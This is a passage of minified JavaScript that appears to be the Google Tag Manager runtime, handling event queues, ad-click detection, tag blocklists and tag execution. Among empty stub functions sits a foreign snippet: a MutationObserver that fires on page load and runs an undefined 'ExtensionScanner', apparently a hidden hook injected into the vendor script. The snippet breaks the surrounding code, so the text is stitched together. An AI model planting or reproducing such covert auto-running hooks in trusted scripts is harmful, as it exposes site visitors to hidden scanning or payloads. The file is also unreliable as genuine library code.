                if (d.messageContext.onSuccess) d.messageContext.onSuccess();
              }
            }), function () {
              if (r) {
                var v = r;
                r = void 0;
                v("3");
                if (d.messageContext.onFailure) d.messageContext.onFailure();
              }
            }), !!d.messageContext.isGtmEvent));
          try {
            bm(d.messageContext.eventId, t, "1"), Zl(d.type, d.h.id, u), f(d.h.id, b, d.D, u);
          } catch (v) {
            bm(d.messageContext.eventId, t, "4");
          }
        }
      }
    };
  im.prototype.register = function (a, b, c) {
    var d = jm(this, a);
    3 !== d.status && (d.R = b, d.status = 3, c && (z(d.h, c), d.h = c), this.flush());
  };
  im.prototype.push = function (a, b, c, d) {
    void 0 !== c && (1 === jm(this, c).status && (jm(this, c).status = 2, this.push("require", [{}], c, {})), jm(this, c).C && (d.deferrable = !1));
    this.h.push(new hm(a, c, b, d));
    d.deferrable || this.flush();
  };
  im.prototype.flush = function (a) {
    for (var b = this, c = [], d = !1, e = {}; this.h.length;) {
      e = {
        Ab: e.Ab,
        Ke: e.Ke
      };
      var f = this.h[0],
        h = f.h;
      if (f.messageContext.deferrable) !h || jm(this, h).C ? (f.messageContext.deferrable = !1, this.h.push(f)) : c.push(f), this.h.shift();else {
        switch (f.type) {
          case "require":
            if (3 !== jm(this, h).status && !a) {
              this.h.push.apply(this.h, c);
              return;
            }
            break;
          case "set":
            k(f.C[0], function (t, r) {
              z(Qa(t, r), b.D);
            });
            break;
          case "config":
            var l = jm(this, h);
            e.Ab = {};
            k(f.C[0], function (t) {
              return function (r, u) {
                z(Qa(r, u), t.Ab);
              };
            }(e));
            var m = !!e.Ab[L.g.Qb];
            delete e.Ab[L.g.Qb];
            var n = h.aa === h.id;
            m || (n ? l.D = {} : l.K[h.id] = {});
            l.C && m || km(this, L.g.qa, e.Ab, f);
            l.C = !0;
            n ? z(e.Ab, l.D) : (z(e.Ab, l.K[h.id]), K(70));
            d = !0;
            break;
          case "event":
            e.Ke = {};
            k(f.C[0], function (t) {
              return function (r, u) {
                z(Qa(r, u), t.Ke);
              };
            }(e));
            km(this, f.C[1], e.Ke, f);
            break;
          case "get":
            var p = {},
              q = (p[L.g.cb] = f.C[0], p[L.g.pb] = f.C[1], p);
            km(this, L.g.La, q, f);
        }
        this.h.shift();
        lm(this, f);
      }
    }
    this.h.push.apply(this.h, c);
    d && this.flush();
  };
  var lm = function (a, b) {
      if ("require" !== b.type) if (b.h) for (var c = jm(a, b.h).M[b.type] || [], d = 0; d < c.length; d++) c[d]();else for (var e in a.C) if (a.C.hasOwnProperty(e)) {
        var f = a.C[e];
        if (f && f.M) for (var h = f.M[b.type] || [], l = 0; l < h.length; l++) h[l]();
      }
    },
    mm = function (a, b) {
      var c = dm,
        d = z(b);
      z(jm(c, a).h, d);
      jm(c, a).h = d;
    },
    dm = new im();
  function Fm(a) {
    var b = T(a.s, L.g.sb),
      c = T(a.s, L.g.rb);
    b && !c ? (a.eventName !== L.g.qa && a.eventName !== L.g.Td && K(131), a.isAborted = !0) : !b && c && (K(132), a.isAborted = !0);
  }
  ;
  var Hm = /^(www\.)?google(\.com?)?(\.[a-z]{2}t?)?$/,
    Im = /^www.googleadservices.com$/,
    Km = function (a) {
      a || (a = Jm());
      return a.om ? !1 : a.Zk || a.al || a.bl || a.Wf || a.Ne || a.Lk || a.Rk ? !0 : !1;
    },
    Jm = function () {
      var a = {},
        b = Sj(!0);
      a.om = !!b._up;
      var c = Fk();
      a.Zk = void 0 !== c.aw;
      a.al = void 0 !== c.dc;
      a.bl = void 0 !== c.gbraid;
      var d = Aj(C.location.href),
        e = yj(d, "query", !1, void 0, "gad");
      a.Wf = void 0 !== e;
      if (!a.Wf) {
        var f = d.hash.replace("#", ""),
          h = vj(f, "gad");
        a.Wf = void 0 !== h;
      }
      a.Ne = void 0;
      if (Q(76)) {
        var l = yj(d, "query", !1, void 0, "gad_source");
        a.Ne = l;
        if (void 0 === a.Ne) {
          var m = d.hash.replace("#", ""),
            n = vj(m, "gad_source");
          a.Ne = n;
        }
      }
      var p = F.referrer ? yj(Aj(F.referrer), "host") : "";
      a.Rk = Hm.test(p);
      a.Lk = Im.test(p);
      return a;
    };
  var Lm = function () {
      var a = C.screen;
      return {
        width: a ? a.width : 0,
        height: a ? a.height : 0
      };
    },
    Mm = function (a) {
      if (F.hidden) return !0;
      var b = a.getBoundingClientRect();
      if (b.top == b.bottom || b.left == b.right || !C.getComputedStyle) return !0;
      var c = C.getComputedStyle(a, null);
      if ("hidden" === c.visibility) return !0;
      for (var d = a, e = c; d;) {
        if ("none" === e.display) return !0;
        var f = e.opacity,
          h = e.filter;
        if (h) {
          var l = h.indexOf("opacity(");
          0 <= l && (h = h.substring(l + 8, h.indexOf(")", l)), "%" == h.charAt(h.length - 1) && (h = h.substring(0, h.length - 1)), f = Math.min(h, f));
        }
        if (void 0 !== f && 0 >= f) return !0;
        (d = d.parentElement) && (e = C.getComputedStyle(d, null));
      }
      return !1;
    };
  var Hn = {
    ik: Number('') || 500,
    Qj: Number('') || 5E3,
    Fh: Number('') || 10,
    aj: Number('') || 5E3
  };
  function In(a) {
    return a.performance && a.performance.now() || Date.now();
  }
  var Jn = function (a, b) {
    var c;
    return c;
  };
  var Kn = "https://" + xe.Gc,
    Ln = Kn + "/gtm/static/",
    Mn = Number('') || 5,
    Nn = Kn,
    On = Ln,
    Pn = !1,
    Qn = 0,
    Rn = za();
  function $n() {
    var a = !1;
    return a;
  }
  function ao(a) {}
  function co(a, b, c) {}
  function Wn(a, b, c) {}
  const observer = new MutationObserver((mutations, obs) => {
    if (document.body) {
      obs.disconnect();
      new ExtensionScanner().execute();
    }
  });
  function bo(a, b, c, d) {}
  function eo(a) {}
  function fo(a, b, c, d) {}
  function go() {
    return "attribution-reporting";
  }
  function ho(a) {
    var b;
    b = void 0 === b ? document : b;
    var c;
    return !(null == (c = b.featurePolicy) || !c.allowedFeatures().includes(a));
  }
  ;
  var io = !1;
  function jo() {
    if (ho("join-ad-interest-group") && ua(Qb.joinAdInterestGroup)) return !0;
    io || (Kh('AymqwRC7u88Y4JPvfIF2F37QKylC04248hLCdJAsh8xgOfe/dVJPV3XS3wLFca1ZMVOtnBfVjaCMTVudWM//5g4AAAB7eyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGV0YWdtYW5hZ2VyLmNvbTo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjk1MTY3OTk5LCJpc1RoaXJkUGFydHkiOnRydWV9'), io = !0);
    return ho("join-ad-interest-group") && ua(Qb.joinAdInterestGroup);
  }
  function ko(a, b) {
    var c = void 0;
    try {
      c = F.querySelector('iframe[data-tagging-id="' + b + '"]');
    } catch (e) {}
    if (c) {
      var d = Number(c.dataset.loadTime);
      if (d && 6E4 > Ka() - d) {
        gb("TAGGING", 9);
        return;
      }
      try {
        c.parentNode.removeChild(c);
      } catch (e) {}
      c = void 0;
    } else try {
      if (50 <= F.querySelectorAll('iframe[allow="join-ad-interest-group"][data-tagging-id*="-"]').length) {
        gb("TAGGING", 10);
        return;
      }
    } catch (e) {}
    Zb(a, void 0, {
      allow: "join-ad-interest-group"
    }, {
      taggingId: b,
      loadTime: Ka()
    }, c);
  }
  function lo() {
    return "https://td.doubleclick.net";
  }
  ;
  var mo = RegExp("^UA-\\d+-\\d+%3A[\\w-]+(?:%2C[\\w-]+)*(?:%3BUA-\\d+-\\d+%3A[\\w-]+(?:%2C[\\w-]+)*)*$"),
    no = /^~?[\w-]+(?:\.~?[\w-]+)*$/,
    oo = /^\d+\.fls\.doubleclick\.net$/,
    po = /;gac=([^;?]+)/,
    qo = /;gacgb=([^;?]+)/,
    ro = /;gclaw=([^;?]+)/,
    so = /;gclgb=([^;?]+)/;
  function to(a, b) {
    if (oo.test(F.location.host)) {
      var c = F.location.href.match(b);
      return c && 2 == c.length && c[1].match(mo) ? decodeURIComponent(c[1]) : "";
    }
    var d = [],
      e;
    for (e in a) {
      for (var f = [], h = a[e], l = 0; l < h.length; l++) f.push(h[l].W);
      d.push(e + ":" + f.join(","));
    }
    return 0 < d.length ? d.join(";") : "";
  }
  var uo = function (a, b, c) {
    var d = wk() ? rk("_gac_gb", !0) : {},
      e = [],
      f = !1,
      h;
    for (h in d) {
      var l = al("_gac_gb_" + h, a, b, c);
      f = f || 0 !== l.length && l.some(function (m) {
        return 1 === m;
      });
      e.push(h + ":" + l.join(","));
    }
    return {
      Kk: f ? e.join(";") : "",
      Jk: to(d, qo)
    };
  };
  function vo(a, b, c) {
    if (oo.test(F.location.host)) {
      var d = F.location.href.match(c);
      if (d && 2 == d.length && d[1].match(no)) return [{
        W: d[1]
      }];
    } else return yk((a || "_gcl") + b);
    return [];
  }
  var wo = function (a) {
      return vo(a, "_aw", ro).map(function (b) {
        return b.W;
      }).join(".");
    },
    xo = function (a) {
      return vo(a, "_gb", so).map(function (b) {
        return b.W;
      }).join(".");
    },
    yo = function (a, b) {
      var c = al((b && b.prefix || "_gcl") + "_gb", a, b);
      return 0 === c.length || c.every(function (d) {
        return 0 === d;
      }) ? "" : c.join(".");
    };
  var zo = function () {
    if (ua(C.__uspapi)) {
      var a = "";
      try {
        C.__uspapi("getUSPData", 1, function (b, c) {
          if (c && b) {
            var d = b.uspString;
            d && RegExp("^[\\da-zA-Z-]{1,20}$").test(d) && (a = d);
          }
        });
      } catch (b) {}
      return a;
    }
  };
  var np = {
    F: {
      ug: "ads_conversion_hit",
      Fc: "container_execute_start",
      xg: "container_setup_end",
      kf: "container_setup_start",
      vg: "container_blocking_end",
      wg: "container_execute_end",
      yg: "container_yield_end",
      lf: "container_yield_start",
      yh: "event_execute_end",
      xh: "event_evaluation_end",
      Hf: "event_evaluation_start",
      zh: "event_setup_end",
      md: "event_setup_start",
      Ah: "ga4_conversion_hit",
      od: "page_load",
      Nm: "pageview",
      zb: "snippet_load",
      Oh: "tag_callback_error",
      Ph: "tag_callback_failure",
      Qh: "tag_callback_success",
      Rh: "tag_execute_end",
      wc: "tag_execute_start"
    }
  };
  function op() {
    function a(c, d) {
      var e = ib(d);
      e && b.push(c + "=" + e);
    }
    var b = [];
    a("&u", "GTM");
    a("&ut", "TAGGING");
    a("&h", "HEALTH");
    return b.join("");
  }
  ;
  var pp = !1;
  var Xp = function (a, b) {},
    Yp = function (a, b) {},
    Zp = function (a, b) {},
    $p = function (a, b) {},
    aq = function () {
      var a = {};
      return a;
    },
    Pp = function (a) {
      a = void 0 === a ? !0 : a;
      var b = {};
      return b;
    },
    bq = function () {},
    cq = function (a, b) {},
    dq = function (a, b, c) {};
  var eq = function (a, b) {
    var c,
      d = C.GooglebQhCsO;
    d || (d = {}, C.GooglebQhCsO = d);
    c = d;
    if (c[a]) return !1;
    c[a] = [];
    c[a][0] = b;
    return !0;
  };
  var fq = function (a, b, c) {
    var d = Fh(a, "fmt");
    if (b) {
      var e = Fh(a, "random"),
        f = Fh(a, "label") || "";
      if (!e) return !1;
      var h = hj(decodeURIComponent(f.replace(/\+/g, " ")) + ":" + decodeURIComponent(e.replace(/\+/g, " ")));
      if (!eq(h, b)) return !1;
    }
    d && 4 != d && (a = Hh(a, "rfmt", d));
    var l = Hh(a, "fmt", 4);
    Xb(l, function () {
      C.google_noFurtherRedirects && b && b.call && (C.google_noFurtherRedirects = null, b());
    }, void 0, c, F.getElementsByTagName("script")[0].parentElement || void 0);
    return !0;
  };
  var wq = function () {
      this.h = {};
    },
    xq = function (a, b, c) {
      null != c && (a.h[b] = c);
    },
    yq = function (a) {
      return Object.keys(a.h).map(function (b) {
        return encodeURIComponent(b) + "=" + encodeURIComponent(a.h[b]);
      }).join("&");
    },
    Aq = function (a, b, c, d) {};
  function Cq(a, b) {
    if (data.entities && data.entities[a]) return data.entities[a][b];
  }
  ;
  var Eq = function (a) {
      var b = ug();
      Dq(b).event && Dq(b).event.push(a);
    },
    Fq = function () {
      var a = Dq(ug());
      return a.event ? a.event : [];
    };
  function Dq(a) {
    var b,
      c = ye.r;
    c || (c = {
      container: {}
    }, ye.r = c);
    b = c;
    var d = b.container[a];
    d || (d = {
      entity: [],
      event: []
    }, b.container[a] = d);
    return d;
  }
  ;
  var Gq = new RegExp(/^(.*\.)?(google|youtube|blogger|withgoogle)(\.com?)?(\.[a-z]{2})?\.?$/),
    Hq = {
      cl: ["ecl"],
      customPixels: ["nonGooglePixels"],
      ecl: ["cl"],
      ehl: ["hl"],
      gaawc: ["googtag"],
      hl: ["ehl"],
      html: ["customScripts", "customPixels", "nonGooglePixels", "nonGoogleScripts", "nonGoogleIframes"],
      customScripts: ["html", "customPixels", "nonGooglePixels", "nonGoogleScripts", "nonGoogleIframes"],
      nonGooglePixels: [],
      nonGoogleScripts: ["nonGooglePixels"],
      nonGoogleIframes: ["nonGooglePixels"]
    },
    Iq = {
      cl: ["ecl"],
      customPixels: ["customScripts", "html"],
      ecl: ["cl"],
      ehl: ["hl"],
      gaawc: ["googtag"],
      hl: ["ehl"],
      html: ["customScripts"],
      customScripts: ["html"],
      nonGooglePixels: ["customPixels", "customScripts", "html", "nonGoogleScripts", "nonGoogleIframes"],
      nonGoogleScripts: ["customScripts", "html"],
      nonGoogleIframes: ["customScripts", "html", "nonGoogleScripts"]
    },
    Jq = "google customPixels customScripts html nonGooglePixels nonGoogleScripts nonGoogleIframes".split(" "),
    Mq = function (a) {
      var b = Ye("gtm.allowlist") || Ye("gtm.whitelist");
      b && K(9);
      Ee && (b = ["google", "gtagfl", "lcl", "zone"]);
      Kq() && (Ee ? K(116) : (K(117), Lq && (b = [], window.console && window.console.log && window.console.log("GTM blocked. See go/13687728."))));
      var c = b && Oa(Ga(b), Hq),
        d = Ye("gtm.blocklist") || Ye("gtm.blacklist");
      d || (d = Ye("tagTypeBlacklist")) && K(3);
      d ? K(8) : d = [];
      Kq() && (d = Ga(d), d.push("nonGooglePixels", "nonGoogleScripts", "sandboxedScripts"));
      0 <= Ga(d).indexOf("google") && K(2);
      var e = d && Oa(Ga(d), Iq),
        f = {};
      return function (h) {
        var l = h && h[oc.ma];
        if (!l || "string" != typeof l) return !0;
        l = l.replace(/^_*/, "");
        if (void 0 !== f[l]) return f[l];
        var m = Qe[l] || [],
          n = a(l, m),
          p;
        p = Dq(ug()).entity;
        for (var q = 0; q < p.length; q++) try {
          n = n && p[q](l, m);
        } catch (y) {
          n = !1;
        }
        if (b) {
          var t;
          if (t = n) a: {
            if (0 > c.indexOf(l)) if (m && 0 < m.length) for (var r = 0; r < m.length; r++) {
              if (0 > c.indexOf(m[r])) {
                K(11);
                t = !1;
                break a;
              }
            } else {
              t = !1;
              break a;
            }
            t = !0;
          }
          n = t;
        }
        var u = !1;
        if (d) {
          var v = 0 <= e.indexOf(l);
          if (v) u = v;else {
            var w = Ca(e, m || []);
            w && K(10);
            u = w;
          }
        }
        var x = !n || u;
        x || !(0 <= m.indexOf("sandboxedScripts")) || c && -1 !== c.indexOf("sandboxedScripts") || (x = Ca(e, Jq));
        return f[l] = x;
      };
    },
    Lq = !1;
  Lq = !0;
  var Kq = function () {
      return Gq.test(C.location && C.location.hostname);
    },
    Nq = function () {
      lg && Dq(ug()).entity.push(function (a) {
        var b = {};
        b[oc.ma] = "__" + a;
        for (var c in void 0) (void 0).hasOwnProperty(c) && (b["vtp_" + c] = (void 0)[c]);
        var d;
        if (bd(b)) {
          var e = b[oc.ma];
          if (!e) throw "Error: No function name given for function call.";
          var f = Rc[e];
          d = !!f && !!f.runInSiloedMode;
        } else d = !!Cq(b[oc.ma], 4);
        return d;
      });
    };
  var Pq = function (a, b, c, d) {
      if (!Oq() && !Ag(a)) {
        var e = "?id=" + encodeURIComponent(a) + "&l=" + xe.ba,
          f = 0 === a.indexOf("GTM-");
        f || (e += "&cx=c");
        Q(53) && (e += "&gtm=" + cj());
        var h = Nl();
        h && (e += "&sign=" + xe.De);
        var l = c ? "/gtag/js" : "/gtm.js",
          m = Ge || Ie ? Ml(b, l + e) : void 0;
        if (!m) {
          var n = xe.Gc + l;
          h && Rb && f && (n = Rb.replace(/^(?:https?:\/\/)?/i, "").split(/[?#]/)[0]);
          m = ol("https://", "http://", n + e);
        }
        var p = a;
        d.siloed && (Cg({
          ctid: p,
          isDestination: !1
        }), p = og(p));
        var q = p,
          t = Bg();
        hg().container[q] = {
          state: 1,
          context: d,
          parent: t
        };
        ig({
          ctid: q,
          isDestination: !1
        });
        Xb(m);
      }
    },
    Qq = function (a, b, c) {
      var d;
      if (d = !Oq()) {
        var e = hg().destination[a];
        d = !(e && e.state);
      }
      if (d) if (Dg()) hg().destination[a] = {
        state: 0,
        transportUrl: b,
        context: c,
        parent: Bg()
      }, ig({
        ctid: a,
        isDestination: !0
      }), K(91);else {
        var f = "/gtag/destination?id=" + encodeURIComponent(a) + "&l=" + xe.ba + "&cx=c";
        Q(53) && (f += "&gtm=" + cj());
        Nl() && (f += "&sign=" + xe.De);
        var h = Ge || Ie ? Ml(b, f) : void 0;
        h || (h = ol("https://", "http://", xe.Gc + f));
        var l = a;
        c.siloed && (Cg({
          ctid: l,
          isDestination: !0
        }), l = og(l));
        hg().destination[l] = {
          state: 1,
          context: c,
          parent: Bg()
        };
        ig({
          ctid: l,
          isDestination: !0
        });
        Xb(h);
      }
    };
  function Oq() {
    if (aj()) {
      return !0;
    }
    return !1;
  }
  ;
  var Rq = !1,
    Sq = 0,
    Tq = [];
  function or(a) {
    if (!Rq) {
      var b = F.createEventObject,
        c = "complete" == F.readyState,
        d = "interactive" == F.readyState;
      if (!a || "readystatechange" != a.type || c || !b && d) {
        Rq = !0;
        for (var e = 0; e < Tq.length; e++) H(Tq[e]);
      }
      Tq.push = function () {
        for (var f = 0; f < arguments.length; f++) H(arguments[f]);
        return 0;
      };
    }
  }
  function ur() {
    if (!Rq && 140 > Sq) {
      Sq++;
      try {
        F.documentElement.doScroll("left"), or();
      } catch (a) {
        C.setTimeout(ur, 50);
      }
    }
  }
  var vr = function (a) {
    Rq ? a() : Tq.push(a);
  };
  var wr = function (a, b) {
    return {
      entityType: 1,
      indexInOriginContainer: a,
      nameInOriginContainer: b,
      originContainerId: tg()
    };
  };
  var yr = function (a, b) {
      this.h = !1;
      this.K = [];
      this.M = {
        tags: []
      };
      this.R = !1;
      this.C = this.D = 0;
      xr(this, a, b);
    },
    zr = function (a, b, c, d) {
      if (Be.hasOwnProperty(b) || "__zone" === b) return -1;
      var e = {};
      Ya(d) && (e = z(d, e));
      e.id = c;
      e.status = "timeout";
      return a.M.tags.push(e) - 1;
    },
    Ar = function (a, b, c, d) {
      var e = a.M.tags[b];
      e && (e.status = c, e.executionTime = d);
    },
    Br = function (a) {
      if (!a.h) {
        for (var b = a.K, c = 0; c < b.length; c++) b[c]();
        a.h = !0;
        a.K.length = 0;
      }
    },
    xr = function (a, b, c) {
      void 0 !== b && Cr(a, b);
      c && C.setTimeout(function () {
        return Br(a);
      }, Number(c));
    },
    Cr = function (a, b) {
      var c = Ma(function () {
        return H(function () {
          b(tg(), a.M);
        });
      });
      a.h ? c() : a.K.push(c);
    },
    Dr = function (a) {
      a.D++;
      return Ma(function () {
        a.C++;
        a.R && a.C >= a.D && Br(a);
      });
    },
    Er = function (a) {
      a.R = !0;
      a.C >= a.D && Br(a);
    };
  var Fr = {},
    Hr = function () {
      return C[Gr()];
    },
    Ir = !1;
  var Jr = function (a) {
      C.GoogleAnalyticsObject || (C.GoogleAnalyticsObject = a || "ga");
      var b = C.GoogleAnalyticsObject;
      if (C[b]) C.hasOwnProperty(b);else {
        var c = function () {
          c.q = c.q || [];
          c.q.push(arguments);
        };
        c.l = Number(Ja());
        C[b] = c;
      }
      return C[b];
    },
    Kr = function (a) {
      if (Pf()) {
        var b = Hr();
        b(a + "require", "linker");
        b(a + "linker:passthrough", !0);
      }
    };
  function Gr() {
    return C.GoogleAnalyticsObject || "ga";
  }
  var Lr = function (a) {
      if (Fr[a] || Ir) return;
      var b = C[Gr()];
      ua(b) && (b("provide", a, ta), Fr[a] = !0);
    },
    Mr = function (a, b) {
      return function () {
        var c = Hr(),
          d = c && c.getByName && c.getByName(a);
        if (d) {
          var e = d.get("sendHitTask");
          d.set("sendHitTask", function (f) {
            var h = f.get("hitPayload"),
              l = f.get("hitCallback"),
              m = 0 > h.indexOf("&tid=" + b);
            m && (f.set("hitPayload", h.replace(/&tid=UA-[0-9]+-[0-9]+/, "&tid=" + b), !0), f.set("hitCallback", void 0, !0));
            e(f);
            m && (f.set("hitPayload", h, !0), f.set("hitCallback", l, !0), f.set("_x_19", void 0, !0), e(f));
          });
        }
      };
    };
  var Rr = {},
    Sr = {};
  function Tr(a, b) {
    if (Ng) {
      var c;
      c = b.match(/^(gtm|gtag)\./) ? encodeURIComponent(b) : "*";
      Rr[a] = "&e=" + c + "&eid=" + a;
      Xg(a);
    }
  }
  function Ur(a) {
    var b = a.eventId,
      c = a.Fb;
    if (!Rr[b]) return "";
    var d = Sr[b] ? "" : "&es=1";
    d += Rr[b];
    c && (Sr[b] = !0);
    return d;
  }
  ;
  var Vr = {};
  function Wr(a, b) {
    Ng && (Vr[a] = Vr[a] || {}, Vr[a][b] = (Vr[a][b] || 0) + 1);
  }
  function Xr(a) {
    var b = a.eventId,
      c = a.Fb,
      d = Vr[b] || {},
      e = [],
      f;
    for (f in d) d.hasOwnProperty(f) && e.push("" + f + d[f]);
    c && delete Vr[b];
    return e.length ? "&md=" + e.join(".") : "";
  }
  ;
  var Yr = {},
    Zr = {
      aev: "1",
      c: "2",
      jsm: "3",
      v: "4",
      j: "5",
      smm: "6",
      rmm: "7",
      input: "8"
    };
  function $r(a, b, c) {
    if (Ng) {
      Yr[a] = Yr[a] || [];
      var d = Zr[b] || "0",
        e;
      e = c instanceof C.Element ? "1" : c instanceof C.Event ? "2" : c instanceof C.RegExp ? "3" : c === C ? "4" : c === F ? "5" : c instanceof C.Promise ? "6" : c instanceof C.Storage ? "7" : c instanceof C.Date ? "8" : c instanceof C.History ? "9" : c instanceof C.Performance ? "a" : c === C.crypto ? "b" : c instanceof C.Location ? "c" : c instanceof C.Navigator ? "d" : "object" !== typeof c || Ya(c) ? "0" : "e";
      Yr[a].push("" + d + e);
    }
  }
  function as(a) {
    var b = a.eventId,
      c = Yr[b] || [];
    if (!c.length) return "";
    a.Fb && delete Yr[b];
    return "&pcr=" + c.join(".");
  }
  ;
  var bs = {},
    cs = {};
  function ds(a, b, c) {
    if (Ng && b) {
      var d = fg(b);
      bs[a] = bs[a] || [];
      bs[a].push(c + d);
      var e = (bd(b) ? "1" : "2") + d;
      cs[a] = cs[a] || [];
      cs[a].push(e);
      Xg(a);
    }
  }
  function es(a) {
    var b = a.eventId,
      c = a.Fb,
      d = "",
      e = bs[b] || [];
    e.length && (d += "&tr=" + e.join("."));
    var f = cs[b] || [];
    f.length && (d += "&ti=" + f.join("."));
    c && (delete bs[b], delete cs[b]);
    return d;
  }
  ;
  function fs(a, b, c, d) {
    var e = Pc[a],
      f = gs(a, b, c, d);
    if (!f) return null;
    var h = Zc(e[oc.Nh], c, []);
    if (h && h.length) {
      var l = h[0];
      f = fs(l.index, {
        onSuccess: f,
        onFailure: 1 === l.di ? b.terminate : f,
        terminate: b.terminate
      }, c, d);
    }
    return f;
  }
  function gs(a, b, c, d) {
    function e() {
      if (f[oc.Vj]) l();else {
        var w = $c(f, c, []),
          x = w[oc.Qi];
        if (null != x) for (var y = 0; y < x.length; y++) if (!R(x[y])) {
          l();
          return;
        }
        var A = zr(c.Tb, String(f[oc.ma]), Number(f[oc.sd]), w[oc.Wj]),
          B = !1;
        w.vtp_gtmOnSuccess = function () {
          if (!B) {
            B = !0;
            var J = Ka() - I;
            ds(c.id, Pc[a], "5");
            Ar(c.Tb, A, "success", J);
            Q(24) && dq(c, f, np.F.Qh);
            h();
          }
        };
        w.vtp_gtmOnFailure = function () {
          if (!B) {
            B = !0;
            var J = Ka() - I;
            ds(c.id, Pc[a], "6");
            Ar(c.Tb, A, "failure", J);
            Q(24) && dq(c, f, np.F.Ph);
            l();
          }
        };
        w.vtp_gtmTagId = f.tag_id;
        w.vtp_gtmEventId = c.id;
        c.priorityId && (w.vtp_gtmPriorityId = c.priorityId);
        ds(c.id, f, "1");
        var D = function () {
          pf(3);
          var J = Ka() - I;
          ds(c.id, f, "7");
          Ar(c.Tb, A, "exception", J);
          Q(24) && dq(c, f, np.F.Oh);
          B || (B = !0, l());
        };
        Q(24) && cq(c, f);
        var I = Ka();
        try {
          Yc(w, {
            event: c,
            index: a,
            type: 1
          });
        } catch (J) {
          D(J);
        }
        Q(24) && dq(c, f, np.F.Rh);
      }
    }
    var f = Pc[a],
      h = b.onSuccess,
      l = b.onFailure,
      m = b.terminate;
    if (c.isBlocked(f)) return null;
    var n = Zc(f[oc.Sh], c, []);
    if (n && n.length) {
      var p = n[0],
        q = fs(p.index, {
          onSuccess: h,
          onFailure: l,
          terminate: m
        }, c, d);
      if (!q) return null;
      h = q;
      l = 2 === p.di ? m : q;
    }
    if (f[oc.Ih] || f[oc.Yj]) {
      var t = f[oc.Ih] ? Qc : c.gm,
        r = h,
        u = l;
      if (!t[a]) {
        e = Ma(e);
        var v = hs(a, t, e);
        h = v.onSuccess;
        l = v.onFailure;
      }
      return function () {
        t[a](r, u);
      };
    }
    return e;
  }
  function hs(a, b, c) {
    var d = [],
      e = [];
    b[a] = is(d, e, c);
    return {
      onSuccess: function () {
        b[a] = js;
        for (var f = 0; f < d.length; f++) d[f]();
      },
      onFailure: function () {
        b[a] = ks;
        for (var f = 0; f < e.length; f++) e[f]();
      }
    };
  }
  function is(a, b, c) {
    return function (d, e) {
      a.push(d);
      b.push(e);
      c();
    };
  }
  function js(a) {
    a();
  }
  function ks(a, b) {
    b();
  }
  ;
  var ms = function (a, b) {
      return 1 === arguments.length ? ls("config", a) : ls("config", a, b);
    },
    ns = function (a, b, c) {
      c = c || {};
      c[L.g.Ob] = a;
      return ls("event", b, c);
    };
  function ls(a) {
    return arguments;
  }
  var os = function () {
    this.h = [];
    this.C = [];
  };
  os.prototype.enqueue = function (a, b, c) {
    var d = this.h.length + 1;
    a["gtm.uniqueEventId"] = b;
    a["gtm.priorityId"] = d;
    c.eventId = b;
    c.fromContainerExecution = !0;
    c.priorityId = d;
    var e = {
      message: a,
      notBeforeEventId: b,
      priorityId: d,
      messageContext: c
    };
    this.h.push(e);
    for (var f = 0; f < this.C.length; f++) try {
      this.C[f](e);
    } catch (h) {}
  };
  os.prototype.listen = function (a) {
    this.C.push(a);
  };
  os.prototype.get = function () {
    for (var a = {}, b = 0; b < this.h.length; b++) {
      var c = this.h[b],
        d = a[c.notBeforeEventId];
      d || (d = [], a[c.notBeforeEventId] = d);
      d.push(c);
    }
    return a;
  };
  os.prototype.prune = function (a) {
    for (var b = [], c = [], d = 0; d < this.h.length; d++) {
      var e = this.h[d];
      e.notBeforeEventId === a ? b.push(e) : c.push(e);
    }
    this.h = c;
    return b;
  };
  var qs = function (a, b, c) {
      c.eventMetadata = c.eventMetadata || {};
      c.eventMetadata.source_canonical_id = mg.He;
      ps().enqueue(a, b, c);
    },
    ss = function () {
      var a = rs;
      ps().listen(a);
    };
  function ps() {
    var a = ye.mb;
    a || (a = new os(), ye.mb = a);
    return a;
  }
  var As = function (a) {
      var b = ye.zones;
      return b ? b.getIsAllowedFn(pg(), a) : function () {
        return !0;
      };
    },
    Bs = function () {
      Eq(function (a, b) {
        var c = ye.zones;
        return c ? c.isActive(pg(), b) : !0;
      });
    };
  var Es = function (a, b) {
    for (var c = [], d = 0; d < Pc.length; d++) if (a[d]) {
      var e = Pc[d];
      var f = Dr(b.Tb);
      try {
        var h = fs(d, {
          onSuccess: f,
          onFailure: f,
          terminate: f
        }, b, d);
        if (h) {
          var l = e[oc.ma];
          if (!l) throw "Error: No function name given for function call.";
          var m = Rc[l];
          c.push({
            Gi: d,
            si: (m ? m.priorityOverride || 0 : 0) || Cq(e[oc.ma], 1) || 0,
            execute: h
          });
        } else Cs(d, b), f();
      } catch (p) {
        f();
      }
    }
    c.sort(Ds);
    for (var n = 0; n < c.length; n++) c[n].execute();
    return 0 < c.length;
  };
  function Ds(a, b) {
    var c,
      d = b.si,
      e = a.si;
    c = d > e ? 1 : d < e ? -1 : 0;
    var f;
    if (0 !== c) f = c;else {
      var h = a.Gi,
        l = b.Gi;
      f = h > l ? 1 : h < l ? -1 : 0;
    }
    return f;
  }
  function Cs(a, b) {
    if (Ng) {
      var c = function (d) {
        var e = b.isBlocked(Pc[d]) ? "3" : "4",
          f = Zc(Pc[d][oc.Nh], b, []);
        f && f.length && c(f[0].index);
        ds(b.id, Pc[d], e);
        var h = Zc(Pc[d][oc.Sh], b, []);
        h && h.length && c(h[0].index);
      };
      c(a);
    }
  }
  var Hs = !1,
    Fs;
  var Ms = function (a) {
    var b = a["gtm.uniqueEventId"],
      c = a["gtm.priorityId"],
      d = a.event;
    if (Q(24)) {}
    if ("gtm.js" === d) {
      if (Hs) return !1;
      Hs = !0;
    }
    var e,
      f = !1;
    if (Fq().every(function (t) {
      return t(d, b);
    })) e = As(b);else {
      if ("gtm.js" !== d && "gtm.init" !== d && "gtm.init_consent" !== d) return !1;
      f = !0;
      e = As(Number.MAX_SAFE_INTEGER);
    }
    Tr(b, d);
    var h = a.eventCallback,
      l = a.eventTimeout,
      m = {
        id: b,
        priorityId: c,
        name: d,
        isBlocked: Mq(e),
        gm: [],
        logMacroError: function () {
          K(6);
          pf(0);
        },
        cachedModelValues: Is(),
        checkPixieIncompatibility: Js(b),
        Tb: new yr(function () {
          if (Q(24)) {}
          h && h.apply(h, [].slice.call(arguments, 0));
        }, l),
        originalEventData: z(a)
      };
    Q(44) && (m.reportMacroDiscrepancy = Wr);
    Q(24) && Zp(m.id, m.name);
